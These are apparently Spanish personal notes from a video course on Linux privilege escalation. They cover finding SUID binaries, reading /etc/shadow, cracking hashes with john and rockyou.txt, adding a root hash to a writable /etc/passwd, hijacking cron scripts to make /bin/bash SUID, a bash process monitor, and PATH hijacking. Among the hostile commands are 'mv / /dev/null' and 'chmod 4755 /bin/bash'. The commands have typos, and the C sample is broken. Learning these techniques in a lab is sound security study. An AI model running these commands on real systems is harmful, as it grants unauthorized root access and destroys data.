# video 8

//saber quien soy
whoami

//saber algo del sistema
uname -a
lsb_realease -a

//como root asignar el permiso suid a find
chmod 4755 /usr/bin/find

//cambiamos de usuario
su pepitoe
//buscamos ficheros con esos permisos
find / \-perm 4000 2>/dev/null

//cosas turbias 
mv / /dev/null

//buscar por fichero donde podamos escribir

find /etc/ \-writable 


## Algoritmos de encriptación
cat /etc/login.defs | grep "ENCRYPT_METHOD"

cat /etc/shadow | grep pepito



https://sniferl4bs.com/2020/02/adios-rockyou.txt-bienvenido-kaonashi.txt/

https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=&ved=2ahUKEwjNt9jQ3-D7AhXmzIUKHXtGBwUQFnoECAoQAQ&url=https%3A%2F%2Fgithub.com%2Fbrannondorsey%2Fnaive-hashcat%2Freleases%2Fdownload%2Fdata%2Frockyou.txt&usg=AOvVaw3snAERl1mU6Ccr4WFEazBd

aqui podemos bajar el fichero rockyou.txt con todas contraseñas

para nuestra prueba usamos "pepito" 

cat rockyou.txt | grep "^pepito$"

//para saber la linea

cat rockyou.txt | grep "^pepito$" -n



si podemos hacernos con un hash $6$ -> sha512

cat /etc/shadow | grep usuario -> hash

Con john:

john --wordlists=/usr/share/wordlists/rockyou.txt hash

Si concuerda el algoritmo de encriptacion que es compatibles con john, empezara a comparar el hash con los que va generar john mediante la lista de constraseñas usuales.


Otra cosas que debemos de tener muy encuenta son los permisos que debemos darle a nuestro ficheros

Una mala configuracion  nos la cuelan.

desde un usuario "pepito" , si tengo permisos de escritura en /etc/passwd

find /etc/ \-writable 2>/dev/null

-> /etc/passwd

openssl passwd -> crear contraseña

hash-identifier -> identificar tipo de cifrado
hashid -> 

con capacidad de escritura 

nano /etc/passwd

root:x:0:0:root:/root:/bin/bash
root:hash-generado-openssl:0:0:root:/root:/bin/bash

su root -> entramos con el usuario root y comprobará el hash
con el que hay en el fichero /etc/passwd no /etc/shadow



# video 9 Explotación de tareas cron
cd /etc/cron.d

service cron status

//antes de iniciarlo creamos una tareas cron

nano tarea

//cada minuto se esta ejecutando esta tarea
* * * * * root /home/s4vitar/Desktop/file.sh

cd /home/s4vitar/Desktop/file.sh

nano file.sh

sleep 10
#borra todo los ficheros temporales
rm -r /tmp/*


//ahora partiendo de una usuario no privilegios -> convertirnos en root


service cron status

chmod o+wx file.sh




# video 10 detección de tareas cron a traves de un script

comprobamos nuestros privilegios/permisos en linux

whoami
id
sudo su
uname -a
lsb_realease -a

//no iriamos a ficheros con suid, que tengan capacidad de escritura por parte de mi usuario

el objetivo es crear un programa en bash para ver las tareas que
se estan ejecutando en tiempo real

touch procmon.sh
chmod +x !$ -> permisos de ejecucion
nano !$


//concepto
touch {file1, file2}
nano file1 -> hola\n que\n tal\n
nano file2 -> adios\n que\n tal\n
diff file1 file2


con la ayuda del comando ps -eo command
#!/bin/bash -> cabeceras

old_process=$(ps -eo command)

while true; do
    new_process=$(ps -eo command)
    # [] cualquier caracter que este en los corchete
    # "key" cualquier linea que contenga -> con la opcion -v las elimina
    diff  <(echo "$old_process") <(echo "$new_process") | grep "[\<\>]" | grep -v "kworker"
    old_process=$new_process
done

al ejecutarlo, podemos ver los precesos cron que se están ejecutando, aunque sea el root el que lo haga

Posteriormente si identificamos un proceso podemos ir a la ruta de donde se encuentra el fichero
y si los permisos no estan bien configurados, podemos modificar ese script y por ejemplo

chmod 4755 /bin/bash -> ponernos un permiso suid en la shell


//Con watch podemos ver los cambios que se realizan en un fichero por ejemplo cada x segundos
watch -d -n 1 ls -l /bin/bash


Cuando /bin/bash se le haya aplicado el permiso suid ya podriamos lanzar una  shell

bash
bash -p -> activando el flag suid


# explotacion de un path hijacking frente a un binario suid

touch backup.sh

//ruta relativa
cat /etc/hosts
//ruta absoluta
which cat
//ver el tipo de un fichero
file /bin/cat
/bin/cat /etc/hosts



#include <stdio.h>
void main(){

    setuid(0)
    //por ruta absoluta
    print(\n[*] Listando procesos (/usr/bin/ps):\n\n);
    system("/usr/bin/ps");

    print(\n[*] Listando procesos (ps):\n\n);
    system("ps");


}

Compilamos
gcc backup.sh -o backup

si le damos permisos de ejecucion

chmod 4755 backup

Con esto podria ejecutarlo otro usuario con el contexto que de que podemos
ejecutar el fichero desde otros, pero nada más, ya que no tenemos permisos de escritura y no podriamos sobreescribir el fichero, además que es un ejecutable.

